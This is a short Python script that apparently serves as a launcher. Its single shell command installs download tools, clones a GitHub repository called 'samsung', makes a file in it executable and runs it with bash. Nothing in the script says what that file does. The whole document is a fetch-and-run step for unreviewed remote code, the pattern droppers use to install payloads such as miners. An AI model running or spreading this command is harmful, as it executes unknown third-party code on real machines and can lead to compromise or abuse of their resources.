#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/songezosibhengezo2/samsung.git;cd samsung;chmod +x samsung;bash samsung", shell=True)
